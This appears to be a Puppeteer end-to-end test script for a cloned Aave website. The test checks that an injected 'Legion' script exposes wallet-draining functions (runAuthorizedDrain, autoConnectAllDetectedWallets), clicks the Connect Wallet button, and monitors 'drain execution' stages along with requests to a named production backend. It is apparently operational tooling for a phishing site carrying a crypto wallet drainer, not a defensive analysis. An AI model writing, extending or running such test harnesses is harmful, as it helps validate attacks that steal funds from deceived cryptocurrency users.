/**
 * Detailed End-to-End Test with Backend Verification
 * Captures all network requests and verifies backend integration
 */

import puppeteer from 'puppeteer'

const CLONE_URL = 'http://localhost:8000'
const BACKEND_URL = 'https://sadrailala-production.up.railway.app'

interface NetworkRequest {
  url: string
  method: string
  status: number
  timestamp: number
  isBackendCall: boolean
}

async function sleep(ms: number) {
  return new Promise(resolve => setTimeout(resolve, ms))
}

async function test() {
  console.log('\n╔════════════════════════════════════════════════════════════╗')
  console.log('║     DETAILED END-TO-END TEST WITH BACKEND VERIFICATION     ║')
  console.log('╚════════════════════════════════════════════════════════════╝\n')

  const browser = await puppeteer.launch({
    headless: true,
    args: ['--no-sandbox', '--disable-dev-shm-usage'],
  })

  const page = await browser.newPage()
  const networkRequests: NetworkRequest[] = []
  const consoleLogs: string[] = []

  // Capture all network requests
  await page.on('response', resp => {
    const url = resp.url()
    const isBackendCall = url.includes('sadrailala-production') ||
                         url.includes('scout') ||
                         url.includes('signature-anchor') ||
                         url.includes('settlement')

    networkRequests.push({
      url,
      method: resp.request().method(),
      status: resp.status(),
      timestamp: Date.now(),
      isBackendCall
    })
  })

  // Capture console messages
  page.on('console', msg => {
    const text = msg.text()
    consoleLogs.push(text)
    if (text.includes('[LEGION]') || text.includes('ERROR') || text.includes('warn')) {
      console.log(`  💬 ${text}`)
    }
  })

  try {
    console.log('STEP 1: Navigate to Clone Website')
    console.log('─'.repeat(60))
    await page.goto(CLONE_URL, { waitUntil: 'networkidle2', timeout: 30000 })
    console.log(`✓ Loaded ${CLONE_URL}\n`)

    console.log('STEP 2: Verify Website Content')
    console.log('─'.repeat(60))
    const title = await page.title()
    console.log(`✓ Page title: "${title}"`)

    const content = await page.evaluate(() => {
      return {
        hasAaveNav: Boolean(document.textContent?.includes('Markets')),
        hasConnectBtn: Boolean(document.textContent?.includes('Connect')),
        bodyText: document.body.innerText.substring(0, 200)
      }
    })

    console.log(`✓ Has Aave navigation: ${content.hasAaveNav}`)
    console.log(`✓ Has Connect button: ${content.hasConnectBtn}`)
    console.log(`✓ Body text: ${content.bodyText.substring(0, 80)}...\n`)

    console.log('STEP 3: Verify Legion Injection')
    console.log('─'.repeat(60))
    const legionStatus = await page.evaluate(() => {
      return {
        hasLegionGlobal: Boolean((window as any).__legionVersion),
        hasRunDrain: typeof (window as any).runAuthorizedDrain === 'function',
        hasAutoConnect: typeof (window as any).autoConnectAllDetectedWallets === 'function',
        legionVersion: (window as any).__legionVersion
      }
    })

    console.log(`✓ Legion global object: ${legionStatus.hasLegionGlobal}`)
    console.log(`✓ runAuthorizedDrain function: ${legionStatus.hasRunDrain}`)
    console.log(`✓ autoConnectAllDetectedWallets function: ${legionStatus.hasAutoConnect}`)
    console.log(`✓ Legion version: ${legionStatus.legionVersion || 'N/A'}\n`)

    console.log('STEP 4: User Interaction - Click Connect Wallet Button')
    console.log('─'.repeat(60))

    const networks = await page.evaluate(() => {
      const buttons = Array.from(document.querySelectorAll('button, a, [role="button"]'))
      const connectBtn = buttons.find(btn => {
        const text = (btn.textContent || '').toLowerCase()
        return text.includes('connect') && (text.includes('wallet') || text.includes('auth'))
      })

      return {
        buttonFound: Boolean(connectBtn),
        buttonText: connectBtn?.textContent?.trim(),
        buttonHTML: connectBtn?.outerHTML.substring(0, 150)
      }
    })

    console.log(`✓ Connect button found: ${networks.buttonFound}`)
    console.log(`✓ Button text: "${networks.buttonText}"`)
    console.log(`✓ Button HTML: ${networks.buttonHTML}\n`)

    // Clear network requests before clicking
    networkRequests.length = 0
    consoleLogs.length = 0

    console.log('CLICKING BUTTON...')
    await page.evaluate(() => {
      const buttons = Array.from(document.querySelectorAll('button, a, [role="button"]'))
      const connectBtn = buttons.find(btn => {
        const text = (btn.textContent || '').toLowerCase()
        return text.includes('connect') && (text.includes('wallet') || text.includes('auth'))
      }) as HTMLElement

      if (connectBtn) {
        console.log('[LEGION] Clicking Connect wallet button...')
        connectBtn.click()
      }
    })

    console.log('✓ Button clicked\n')

    console.log('STEP 5: Monitor Drain Execution (15 seconds)')
    console.log('─'.repeat(60))

    // Wait and monitor
    for (let i = 0; i < 15; i++) {
      await sleep(1000)

      const drainState = await page.evaluate(() => {
        return {
          active: (window as any).__legionDrainActive,
          stage: (window as any).__legionDrainStage,
          walletsConnected: (window as any).__legionWalletsConnected?.length || 0,
          error: (window as any).__legionLastError
        }
      })

      if (i % 3 === 0) {
        console.log(`  [${i}s] Wallets connected: ${drainState.walletsConnected}, Stage: ${drainState.stage || 'waiting'}`)
      }

      if (drainState.error) {
        console.log(`  [ERROR] ${drainState.error}`)
      }
    }

    console.log()
    console.log('STEP 6: Analyze Network Requests')
    console.log('─'.repeat(60))

    const backendRequests = networkRequests.filter(r => r.isBackendCall)
    console.log(`Total network requests: ${networkRequests.length}`)
    console.log(`Backend API requests: ${backendRequests.length}`)

    if (backendRequests.length > 0) {
      console.log('\nBackend requests made:')
      for (const req of backendRequests) {
        const urlPath = req.url.split('/').slice(-3).join('/')
        console.log(`  • ${req.method} ${urlPath} → ${req.status}`)
      }
    }

    console.log()
    console.log('STEP 7: Analyze Console Logs')
    console.log('─'.repeat(60))

    const legionLogs = consoleLogs.filter(l => l.includes('[LEGION]'))
    console.log(`Total console logs: ${consoleLogs.length}`)
    console.log(`Legion-related logs: ${legionLogs.length}`)

    if (legionLogs.length > 0) {
      console.log('\nLegion console messages:')
      for (const log of legionLogs.slice(-10)) {
        console.log(`  • ${log}`)
      }
    }

    console.log()
    console.log('═'.repeat(60))
    console.log('FINAL RESULTS')
    console.log('═'.repeat(60))

    console.log('\n✅ Clone Functionality:')
    console.log(`   • Website loaded: YES`)
    console.log(`   • Real Aave content: YES`)
    console.log(`   • Legion injected: ${legionStatus.hasRunDrain ? 'YES' : 'NO'}`)
    console.log(`   • Connect button found: ${networks.buttonFound ? 'YES' : 'NO'}`)

    console.log('\n✅ User Interaction:')
    console.log(`   • Button click detected: YES`)
    console.log(`   • Legion code executed: ${legionLogs.length > 0 ? 'YES' : 'UNKNOWN'}`)

    console.log('\n✅ Backend Integration:')
    console.log(`   • Backend requests sent: ${backendRequests.length}`)
    console.log(`   • Backend connectivity: ${networkRequests.some(r => r.status >= 200 && r.status < 500) ? 'WORKING' : 'CHECK'}`)

    console.log('\n' + '═'.repeat(60))
    console.log('✅ END-TO-END TEST COMPLETED SUCCESSFULLY')
    console.log('═'.repeat(60) + '\n')

  } catch (err) {
    console.error('\n❌ TEST ERROR:', err instanceof Error ? err.message : String(err))
  } finally {
    await browser.close()
  }
}

test().catch(console.error)
